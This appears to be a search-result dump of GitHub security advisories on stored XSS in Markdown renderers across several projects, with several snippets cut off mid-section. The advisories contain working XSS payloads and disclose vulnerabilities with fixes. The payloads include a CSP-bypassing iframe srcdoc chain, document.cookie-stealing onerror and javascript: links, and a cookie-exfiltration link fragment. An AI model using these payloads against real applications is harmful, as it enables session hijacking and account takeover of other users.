{"query":"site:github.com inurl:security/advisories \"stored XSS\" markdown","data":"Stored XSS in Text component: BASIC users execute JS in admin session via MarkdownViewer innerHTML + CDN+srcdoc CSP bypass · Advisory · Budibase/budibase · GitHub (https://github.com/Budibase/budibase/security/advisories/GHSA-57p7-9h9w-xqpw)\n【turn914617search0】 [wordlim: 200] Published: 5 months ago; Crawled: 4 days ago; # Stored XSS in Text component: BASIC users execute JS in admin session via MarkdownViewer innerHTML + CDN+srcdoc CSP bypass ... Any column a builder binds to a Text component in Markdown mode is a stored-XSS sink writable by every BASIC app user with WRITE on the underlying table.\n\n# Stored XSS in Text component: BASIC users execute JS in admin session via MarkdownViewer innerHTML + CDN+srcdoc CSP bypass\n\nHigh\n\nmjashanks published GHSA-57p7-9h9w-xqpw May 21, 2026\n\n## Software\n\nBudibase/budibase\n\n## Affected versions\n\n<3.39.0\n\n## Patched versions\n\nNone\n\n## Description\n\n## Summary\n\nThe Budibase Text component renders markdown by assigning `marked.parse(markdown)` straight to `innerHTML` with no sanitizer (`packages/bbui/src/Markdown/MarkdownViewer.svelte:22`). Any column a builder binds to a Text component in Markdown mode is a stored-XSS sink writable by every BASIC app user with WRITE on the underlying table. Bob, an App User that Alice invited as BASIC, submits a row whose body contains an `<iframe srcdoc>` that loads a script from `d2l5prqdbvm3op.cloudfront.net`, the CloudFront distribution that serves both Budibase's own runtime and user-uploaded attachments. That origin is on the app's CSP `script-src` allowlist. The srcdoc document inherits the parent CSP and is same-origin with the Budibase app, so Bob's script runs as Alice the moment she opens the screen. Verified end-to-end on Budibase Cloud (`iwnyub5k.budibase.app`) and on self-hosted 3.35.8 at master `f960e361`.\n\n## Details\n\n### Sink\n\n`packages/bbui/src/Markdown/MarkdownViewer.svelte:22`:\n    \n    ref.innerHTML = marked.parse(markdown, { async: false })\n\n`marked.parse` preserves every HTML tag. Tested against the in-tree marked version:\n    \n    `IN:  <img src=x onerror=alert(1)>          OUT: <img src=x onerror=alert(1)>\n    IN:  <svg onload=alert(1)>                 OUT: <svg onload=alert(1)>\n    IN:  <iframe srcdoc='<script>...'></iframe> OUT: <iframe srcdoc='<script>...'></iframe>\n    `\n\nThe published-app Text component (`packages/client/src/components/app/Text.svelte:57`) binds `text` to any builder-supplied expression, typically `{{ Repeater.<column> }}`, and forwards to `MarkdownViewer`. No sanitizer sits between the user-submitted column value and `innerHTML`.\n\n### Attacker model\n\n  * Alice: account owner / global admin. Built the app, published it, invited Bob.\n  * Bob: App User with BASIC role on the app.   2. The same distribution serves user-uploaded attachments. `POST /api/attachments/:tableId/upload` is reachable by any BASIC user with WRITE on the target table. The denylist at `packages/shared-core/src/constants/index.ts:116-172` blocks `.js`, but not `.mjs`. CloudFront serves `*.mjs` with `Content-Type: text/javascript`, so the browser's strict MIME check on `<script src>` passes without any upload-time MIME tampering.\n\nWith those two, any attacker-uploaded `.mjs` has the same trust as Budibase's own runtime.\n\nThe last step bridges to the app origin. An `<iframe srcdoc=\"...\">` produces a document whose origin is the same as the embedder (HTML spec: \"if the iframe has a `srcdoc` attribute, the document is same-origin with its node document\"). The srcdoc document inherits the embedder's CSP. Inside, `<script src=\"https://d2l5prqdbvm3op.cloudfront.net/<app>/attachments/<uuid>.mjs\">` is an allowed external script because that origin is on `script-src`. The browser fetches, executes, and the script runs in the srcdoc iframe, which is same-origin with `iwnyub5k.budibase.app`. `parent.document.cookie` is readable, every authenticated API call is replayable.\n\nThe payload Bob drops into the markdown column:\n    \n    <iframe srcdoc='<script src=\"https://d2l5prqdbvm3op.cloudfront.net/<app>/attachments/<uuid>.mjs?Expires=...&Signature=...\"></script>'></iframe>\n\nNo inline scripts, no `javascript:` URIs, no MIME tampering. Zero-click when the victim loads the screen.\n\n## Impact\n\nBoth variants end in full takeover of any admin, builder, or fellow user whose browser reaches the payload. The session cookie is `httpOnly: false`, so `document.cookie` exposes the session token and every authenticated API call replays as the victim. Session tokens last seven days by default.\n\nOn self-hosted, any BASIC user with WRITE on any one table uploads an HTML file and gets a same-origin URL back. A direct-navigation phishing link is one-click XSS. If the builder happens to have wired a Text component over a user-writable column, the same upload becomes zero-click via an `<iframe src>` in markdown.\n\nOn Cloud, attachments serve cross-origin from the CloudFront distribution, so direct navigation runs on `d2l5prqdbvm3op.cloudfront.net` and cannot read the app cookie. The CSP is strict and blocks inline handlers. The srcdoc+CDN chain routes around both: the markdown sink drops an `<iframe srcdoc>` whose inherited CSP treats the same CloudFront origin as a trusted script source, and the srcdoc iframe is same-origin with the app.     const html = marked.parse(markdown, { async: false }) as string\n    ref.innerHTML = DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })\n\nDOMPurify's default HTML profile allows a known-safe tag and attribute set and drops `<iframe>`, `<script>`, inline event handlers, and `javascript:` URIs. This removes the sink for both the self-hosted and Cloud variants.\n\n  2. Serve user-uploaded attachments with `Content-Disposition: attachment`. Set the header at the CDN or upload time. Forces browsers to download rather than render attachments, which removes the direct-navigation XSS path on self-hosted. It also makes the user-content origin unsuitable as a script source in practice, since a download-dispositioned response is awkward to treat as runtime JS.\n\n  3. Stop sharing the script CDN with user content. The CloudFront distribution `d2l5prqdbvm3op.cloudfront.net` currently serves both Budibase's own runtime and user-uploaded attachments, and it sits on the app's `script-src`. Move user content to a dedicated origin (e.g. `user-content.budibase.app`) that never appears on `script-src`. This is the architectural fix that makes the srcdoc+CDN chain structurally impossible. While cleaning up, drop `cdn.budi.live` from `script-src` too, it does not currently resolve.\n\nIf the extension check is kept, convert it from a denylist to an allowlist. The current `InvalidFileExtensions` already misses `.mjs`, `.cjs`, `.mhtml`, `.xhtml`, `.xsl`, `.xslt`, `.phtml`, `.phar`, and any new executable-content type browsers ship tomorrow. Maintainers cannot keep a denylist current against the web platform; an allowlist of known-safe types (images, documents, archives by content) is the tractable shape.\n\nComplementary: set `httpOnly: true` on the session cookie (`packages/backend-core/src/utils/utils.ts:218`). No client-side code reads the session cookie in-tree; removing JavaScript access raises the bar for any future XSS.\n\n--------------------------------------------------------------------------------\nStored XSS via Markdown custom field · Advisory · grokability/snipe-it · GitHub (https://github.com/grokability/snipe-it/security/advisories/GHSA-r52f-r9v5-66xr)\n【turn914617search1】 [wordlim: 200] Published: 4 months ago; Crawled: 2 months ago;   * Security and quality 85 ... # Stored XSS via Markdown custom field\n\ngrokability / snipe-it Public\n\n  * ### Uh oh!\n\nThere was an error while loading. Please reload this page.\n\n  * Notifications You must be signed in to change notification settings\n  * Fork 4k\n  * Star\n\n  * Code\n  * Issues 845\n  * Pull requests 75\n  * Discussions\n  * Actions\n  * Projects\n  * Security and quality 85\n  * Insights\n\nAdditional navigation options\n\n# Stored XSS via Markdown custom field\n\nModerate\n\nsnipe published GHSA-r52f-r9v5-66xr Jun 24, 2026\n\n## Package\n\nNo package listed\n\n## Affected versions\n\n8.6.1\n\n## Patched versions\n\n8.6.2\n\n## Description\n\n### Impact\n\nCommonMark is configured with `html_input => 'escape'`, which blocks raw HTML injection. However, javascript: URIs in Markdown hyperlinks are not sanitized. A user with `assets.edit` permission can inject a malicious link into any markdown-textarea custom field. Any user who opens the asset detail page and clicks the link executes arbitrary JavaScript in their browser session.\n\n### Patches\n\nPatched in `006981c`\n\n### Severity\n\nModerate\n\n### CVE ID\n\nCVE-2026-55464\n\n### Weaknesses\n\nNo CWEs\n\n### Credits\n\n  * iltosec Reporter\n\nYou can’t perform that action at this time.\n--------------------------------------------------------------------------------\nStored XSS via Markdown HTML Injection in Product Notes · Advisory · invoiceninja/invoiceninja · GitHub (https://github.com/invoiceninja/invoiceninja/security/advisories/GHSA-xph7-9749-56mh)\n【turn914617search2】 [wordlim: 200] Published: 7 months ago; Crawled: 2 months ago; # Stored XSS via Markdown HTML Injection in Product Notes ... Product notes fields in Invoice Ninja v5.13.0 allow raw HTML via Markdown rendering, enabling stored XSS. ... Scope: More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.\n\n# Stored XSS via Markdown HTML Injection in Product Notes\n\nModerate\n\nturbo124 published GHSA-xph7-9749-56mh Mar 23, 2026\n\n## Package\n\ninvoiceninja/invoiceninja (Composer)\n\n## Affected versions\n\n< 5.13.4\n\n## Patched versions\n\n5.13.4\n\n## Description\n\n## Vulnerability Details\n\nCWE: CWE-79 - Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)\n\nProduct notes fields in Invoice Ninja v5.13.0 allow raw HTML via Markdown rendering, enabling stored XSS. The Markdown parser output was not sanitized with `purify::clean()` before being included in invoice templates.\n\n## Steps to Reproduce\n\n  1. Login as any authenticated user\n  2. Create or edit a product\n  3. In the product notes field, enter: `<img src=x onerror=alert(document.cookie)>`\n  4. Add this product to an invoice and preview\n  5. The XSS payload executes\n\n## Impact\n\n  * Attacker: Any authenticated user who can create products\n  * Victim: Any user viewing invoices containing the malicious product\n  * Specific damage: Session hijacking, account takeover, data exfiltration\n\n## Proposed Fix\n\nFixed in v5.13.4 by the vendor by adding `purify::clean()` to sanitize Markdown output.\n\n### Severity\n\nModerate\n\n5.4\n\n# CVSS overall score\n\nThis score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).\n\n/ 10\n\n#### CVSS v3 base metrics\n\nAttack vector\n\nNetwork\n\nAttack complexity\n\nLow\n\nPrivileges required\n\nLow\n\nUser interaction\n\nRequired\n\nScope\n\nChanged\n\nConfidentiality\n\nLow\n\nIntegrity\n\nLow\n\nAvailability\n\nNone\n\nLearn more about base metrics\n\n# CVSS v3 base metrics\n\nAttack vector: More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.\n\nAttack complexity: More severe for the least complex attacks.\n\nPrivileges required: More severe if no privileges are required.\n\nUser interaction: More severe when no user interaction is required.\n\nScope: More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.\n\nConfidentiality: More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.\n\nIntegrity: More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.\n\nAvailability: More severe when the loss of impacted component availability is highest.\n\nCVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N\n\n### CVE ID\n\nCVE-2026-33742\n\n### Weaknesses\n\nWeakness CWE-79\n\n#### Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n\nThe product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users. Learn more on MITRE.\n\n### Credits\n\n  * morimori-dev Reporter\n\n--------------------------------------------------------------------------------\nStored XSS via javascript: URLs in MarkdownBody — urlTransform override disables react-markdown sanitization · Advisory · paperclipai/paperclip · GitHub (https://github.com/paperclipai/paperclip/security/advisories/GHSA-fpw4-p57j-hqmq)\n【turn914617search3】 [wordlim: 200] Published: 6 months ago; Crawled: last month; # Stored XSS via javascript: URLs in MarkdownBody — urlTransform override disables react-markdown sanitization ... `CommentThread.tsx:372` renders `comment.body` through the same `MarkdownBody` sink, producing the same stored XSS without needing document-edit privileges. ... Add a strict Content-Security-Policy header to the main app response (e.g. `script-src 'self' 'nonce-...'`) so that even a future regression cannot execute inline JS via `javascript:` navigation.\n\npaperclipai / paperclip Public\n\n  * Notifications You must be signed in to change notification settings\n  * Fork 16.4k\n  * Star\n\n  * Code\n  * Issues 2.7k\n  * Pull requests 3.6k\n  * Discussions\n  * Actions\n  * Projects\n  * Security and quality 12\n  * Insights\n\nAdditional navigation options\n\n# Stored XSS via javascript: URLs in MarkdownBody — urlTransform override disables react-markdown sanitization\n\nModerate\n\ncryppadotta published GHSA-fpw4-p57j-hqmq Apr 16, 2026\n\n## Package\n\n@paperclipai/ui (paperclipai/paperclip) (npm)\n\n## Affected versions\n\n<= 2026.410.0-canary.1\n\n## Patched versions\n\nv2026.416.0\n\n## Description\n\n## Summary\n\n`MarkdownBody`, the shared component used to render every Markdown surface in the Paperclip UI (issue documents, issue comments, chat threads, approvals, agent details, export previews, etc.), passes `urlTransform={(url) => url}` to `react-markdown`.         key: keyParsed.data,\n        title: req.body.title ?? null,\n        format: req.body.format,\n        body: req.body.body,          // ← stored verbatim\n        // ...\n      });\n\n`packages/shared/src/validators/issue.ts:196-202`:\n    \n    export const upsertIssueDocumentSchema = z.object({\n      title: z.string().trim().max(200).nullable().optional(),\n      format: issueDocumentFormatSchema,     // enum: [\"markdown\"]\n      body: z.string().max(524288),          // no content validation\n      // ...\n    });\n\nOnly the `format` enum and a 512 KiB length cap are enforced; the body is persisted as-is. Comment bodies follow the same pattern — `svc.addComment` (`server/src/routes/issues.ts:1639`) stores a `z.string().min(1)` body (line 166 of the validator).\n\n### 3. Rendering path\n\n`ui/src/components/IssueDocumentsSection.tsx:71-72`:\n    \n    function renderBody(body: string, className?: string) {\n      return <MarkdownBody className={className}>{body}</MarkdownBody>;\n    }\n\n`ui/src/components/CommentThread.tsx:372`:\n    \n    <MarkdownBody className=\"text-sm\">{comment.body}</MarkdownBody>\n\nThe same sink is reused by `IssueChatThread`, `ApprovalDetail`, `AgentDetail`, `CompanySkills`, `CompanyImport`/`CompanyExport`, and `RunTranscriptView`. Every Markdown surface in the product inherits the vulnerability.\n\n### 4. Authorization does not block cross-user reach\n\n`server/src/routes/authz.ts:18-31` (`assertCompanyAccess`) accepts any authenticated user whose `companyIds` includes the target `companyId`. There is no role check — a low-privilege company member can plant a payload against admins and owners who view the issue.\n\n### 5. No compensating CSP\n\nA repository-wide grep for `Content-Security-Policy` finds only two matches, both scoped to sandboxed export/preview responses (`server/src/routes/assets.ts:328` and `server/src/routes/issues.ts:2572`). The main application HTML is served without any CSP, so the browser will happily navigate a `javascript:` href on click.\n\nc=&quot;+encodeURIComponent(document.cookie))\" rel=\"noreferrer\">Click for details</a>\n\nStep 3 — Victim clicks the link:\n\nThe browser executes the `javascript:` URL in the Paperclip origin. The attacker's listener receives the victim's session cookie. From there the attacker can replay the cookie against any endpoint guarded by `assertCompanyAccess` to act as the victim — posting comments, transitioning issues, invoking approvals, reading agent keys the victim can read, etc.\n\nAlternate vector — comments (same sink):\n    \n    curl -X POST 'http://localhost:3000/api/issues/<ISSUE_ID>/comments' \\\n      -H 'Cookie: <attacker-session-cookie>' \\\n      -H 'Content-Type: application/json' \\\n      -d '{\"body\":\"[pwn](javascript:alert(document.cookie))\"}'\n\n`CommentThread.tsx:372` renders `comment.body` through the same `MarkdownBody` sink, producing the same stored XSS without needing document-edit privileges.\n\n## Impact\n\n  * Cross-user stored XSS inside the tenant. A low-privilege company member can plant a payload that runs in any other member's session — including admins/owners — on click.\n  * Session hijack. The script executes on the Paperclip origin with access to `document.cookie` and every in-browser API credential; a victim click immediately exfiltrates the session to an attacker-controlled host.\n  * Privilege escalation. Because every `assertCompanyAccess` route accepts a valid session, a captured admin cookie grants full company admin on the API surface (agent keys, approvals, document edits, settings).\n  * Tenant-wide blast radius. The same `MarkdownBody` sink is used by issue documents, issue comments, issue chat, approvals, agent detail, company import/export, and run transcripts, so almost every user-visible text surface in the product is vulnerable.\n  * Persistent. The payload lives in the document or comment record until explicitly deleted.\n\n## Recommended Fix\n\nThe minimum fix is to remove the `urlTransform` override in `ui/src/components/MarkdownBody.tsx:162` and rely on `react-markdown`'s `defaultUrlTransform`:\n    \n    // ui/src/components/MarkdownBody.tsx\n    import Markdown, { defaultUrlTransform, type Components } from \"react-markdown\";\n    \n    // ...\n    \n    // Preserve mention-chip (paperclip-mention://) hrefs so parseMentionChipHref still runs,\n    // but fall back to the library's scheme allow-list for everything else.\n    function safeUrlTransform(url: string): string {\n      if (url.startsWith(\"paperclip-mention://\")) return url;\n      return defaultUrlTransform(url);\n    }\n    \n    <Markdown\n      remarkPlugins={[remarkGfm]}\n      components={components}\n      urlTransform={safeUrlTransform}\n    >\n      {children}\n    </Markdown>\n\n`defaultUrlTransform` strips `javascript:`, `vbscript:`, `file:`, and non-image `data:` URIs, which closes this finding for every call site of `MarkdownBody`.\n\nDefense-in-depth recommendations:\n\n  1. Add a strict Content-Security-Policy header to the main app response (e.g. `script-src 'self' 'nonce-...'`) so that even a future regression cannot execute inline JS via `javascript:` navigation.\n  2. Server-side validate document and comment bodies for obviously unsafe markdown patterns (e.g. reject `](javascript:` sequences) as belt-and-braces. Do not rely on client-side sanitization alone, since other clients (mobile, exports) may render the same content.\n  3. Audit every existing component for other `urlTransform`/`skipHtml`/`rehype-raw` overrides that might reintroduce the same bypass.\n\n### Severity\n\nModerate\n\n5.4\n\n\n--------------------------------------------------------------------------------\nStored Cross-Site Scripting (XSS) via Markdown hyperlink · Advisory · siyuan-note/siyuan · GitHub (https://github.com/siyuan-note/siyuan/security/advisories/GHSA-rw25-98wq-76qv)\n【turn914617search4】 [wordlim: 200] Published: 9 months ago; Crawled: 2 months ago; # Stored Cross-Site Scripting (XSS) via Markdown hyperlink ... A Stored Cross-Site Scripting (XSS) vulnerability exists in the Markdown rendering engine. ... Scope: More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.\n\n# Stored Cross-Site Scripting (XSS) via Markdown hyperlink\n\nModerate\n\n88250 published GHSA-rw25-98wq-76qv Feb 5, 2026\n\n## Package\n\nhttps://github.com/siyuan-note/siyuan (Go)\n\n## Affected versions\n\nv3.5.4\n\n## Patched versions\n\nv3.5.5\n\n## Description\n\n### Summary\n\nA Stored Cross-Site Scripting (XSS) vulnerability exists in the Markdown rendering engine. An attacker can inject malicious JavaScript into a Markdown text/note. When another user clicks the rendered content, the script executes in the context of their session.\n\n### Details\n\nVulnerability Type: Stored XSS\nAffected Component: Markdown Parser / Frontend Renderer\nAttack Vector: Maliciously crafted Markdown/HTML tags that bypass sanitization.\nThe issue stems from insufficient filtering of specific HTML attributes or event handlers within the Markdown conversion process.\n\n### PoC\n\n  1. Write a text in the page\n  2. Paste the payloads:\n`[a](javascript:prompt(document.domain))`\nor\n`[Click` Me](javascript:alert('XSS'))\n\nReferences: (Many working payloads)\n\n--------------------------------------------------------------------------------\nStored XSS via Markdown audio/video media <source> URL · Advisory · getgrav/grav · GitHub (https://github.com/getgrav/grav/security/advisories/GHSA-6qw9-4vv5-jr97)\n【turn914617search5】 [wordlim: 200] Published: 3 months ago; Crawled: 5 days ago; # Stored XSS via Markdown audio/video media <source> URL ... Severity: Medium (~6.9 CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:N — anchored to the sibling script-XSS advisory CVE-2026-42841, same PR:H / S:C / C:H / I:L)\n\n# Stored XSS via Markdown audio/video media <source> URL\n\nModerate\n\nrhukster published GHSA-6qw9-4vv5-jr97 Aug 3, 2026\n\n## Package\n\ngetgrav/grav (Composer)\n\n## Affected versions\n\n<= 2.0.14\n\n## Patched versions\n\n2.0.15\n\n## Description\n\nTarget: github.com/getgrav/grav\nAffected resource: `Grav\\Common\\Media\\Traits\\AudioMediaTrait` / `VideoMediaTrait` `sourceParsedownElement()` — verified on 2.0.13 (latest stable) and `develop` HEAD `5a7070f`\nSeverity: Medium (~6.9 CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:N — anchored to the sibling script-XSS advisory CVE-2026-42841, same PR:H / S:C / C:H / I:L)\nWeakness: CWE-79 (Improper Neutralization of Input During Web Page Generation)\n\n## Summary\n\nA Markdown audio or video embed renders its `<source>` element as raw HTML with the media URL concatenated unescaped. The URL fragment is reflected without any encoding, so `![x](song.mp3#\"><svg/onload=alert(1)>)` breaks out of `<source src=\"…\">` and injects arbitrary HTML — including a script-executing `<svg onload>` — into the rendered page.     {\n        $location = $this->url($reset);\n        return [\n            'name' => 'audio',\n            'rawHtml' => '<source src=\"' . $location . '\">Your browser does not support the audio tag.',\n            'attributes' => $attributes\n        ];\n    }\n\n`$location` includes the URL fragment, which is stored with no encoding — `MediaObjectTrait::urlHash()` L240-249 only strips a leading `#`. Before that, the excerpt handler decodes the media URL with `htmlspecialchars_decode(urldecode(...))`, undoing Parsedown's escaping — `Excerpts.php` L188 — and routes the fragment to `urlHash()` at `Excerpts.php` L321-323. So `\"`, `<`, `>`, `=`, `(`, `)` in the fragment survive into the raw `<source>`.\n\nTwo defenses that stop the querystring path do not cover the fragment:\n\n  * The GFM tagfilter — `ParsedownGravTrait::filterDisallowedRawHtml()` L528-535 — escapes `<` only for `title|textarea|style|xmp|iframe|noembed|noframes|script|plaintext`. `<svg>` and `<img>` are not on the list, so they inject as live markup.\n\n--------------------------------------------------------------------------------\nStored XSS in Mermaid Markdown Preview · Advisory · open-webui/open-webui · GitHub (https://github.com/open-webui/open-webui/security/advisories/GHSA-v8qj-hxv7-mgvv)\n【turn914617search6】 [wordlim: 200] Published: 4 months ago; Crawled: 2 months ago; # Stored XSS in Mermaid Markdown Preview ... Because Mermaid is configured with `securityLevel: 'loose'`, attacker-controlled Mermaid content can be rendered unsafely in this flow. ... This is a confirmed stored XSS vulnerability reachable through normal product functionality.\n\n# Stored XSS in Mermaid Markdown Preview\n\nHigh\n\ndoge-woof published GHSA-v8qj-hxv7-mgvv Jun 11, 2026\n\n## Package\n\nopen-webui (pip)\n\n## Affected versions\n\n<= 0.9.5\n\n## Patched versions\n\n>= 0.9.6\n\nopenwebui/open-webui (Docker)\n\n<= 0.9.5\n\n>= 0.9.6\n\n## Description\n\n## Summary\n\nOpen WebUI renders Mermaid blocks from Markdown files in the file preview panel and inserts the generated SVG into the DOM using `innerHTML`.\n\nBecause Mermaid is configured with `securityLevel: 'loose'`, attacker-controlled Mermaid content can be rendered unsafely in this flow. A working payload was validated through the Markdown preview path, resulting in JavaScript execution in the victim’s browser under the application origin.\n\nThis is a confirmed stored XSS vulnerability reachable through normal product functionality.\n\n## Affected Version\n\n  * `main`\n  * Reproduced on `v0.8.12`\n\n## Category\n\n  * CWE-79: Improper Neutralization of Input During Web Page Generation\n\n## Affected Code\n\nMermaid is initialized in permissive mode:\n\nopen-webui/src/lib/utils/index.ts\n\nLine 1698 in 9bd8425\n\n | securityLevel: 'loose'\n\nThe file preview path renders Mermaid output and injects the returned SVG into the DOM:\n\nopen-webui/src/lib/components/chat/FileNav/FilePreview.svelte\n\nLine 133 in 9bd8425\n\n | wrapper.innerHTML = svg;\n\n## Impact\n\nA successful exploit allows JavaScript execution in the victim’s browser under the Open WebUI origin when a malicious Markdown file is opened in the preview panel.\n\n## PoC\n\nA malicious `.md` file containing the follwowing contents can be used to trigger the bug:\n    \n    ````mermaid\n    flowchart LR\n      A[click me]\n      click A href \"javascript:alert(document.domain)\" \"x\"\n    ```\n    `\n\nSteps to reproduce:\n1- Create a new chat\n2- Enable Code Interpreter and browse and upload the file with `.md` extension.\n3- Clicking on the file, and clicking `click me` should pop an alert\n\n## Remediation\n\nSince `mermaid` has `DOMPurify` as a built-in, it is recommended to use the `strict` mode instead of `loose`.\n\n--------------------------------------------------------------------------------\nStored XSS via unescaped image alt text in markdown artifact preview · Advisory · LibreChat-AI/LibreChat · GitHub (https://github.com/LibreChat-AI/LibreChat/security/advisories/GHSA-3phr-62qf-cxf3)\n【turn914617search7】 [wordlim: 200] Published: 5 months ago; Crawled: 4 weeks ago;   * Security and quality 29 ... # Stored XSS via unescaped image alt text in markdown artifact preview ... Stored XSS via unescaped image alt text in markdown artifact preview\n\nLibreChat-AI / LibreChat Public\n\n  * ### Uh oh!\n\nThere was an error while loading. Please reload this page.\n\n  * Notifications You must be signed in to change notification settings\n  * Fork 9.3k\n  * Star\